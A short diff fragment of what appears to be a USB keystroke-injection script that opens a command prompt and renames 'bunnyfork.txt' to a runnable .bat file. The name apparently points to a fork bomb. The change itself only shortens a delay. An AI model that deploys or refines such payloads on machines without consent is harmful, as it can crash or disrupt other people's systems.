@@ -19,7 +19,7 @@ GUI r
 DELAY 200
 STRING cmd
 ENTER
-DELAY 1000
+DELAY 200
 STRING cd hello
 ENTER
 STRING rename bunnyfork.txt bunnyfork.bat
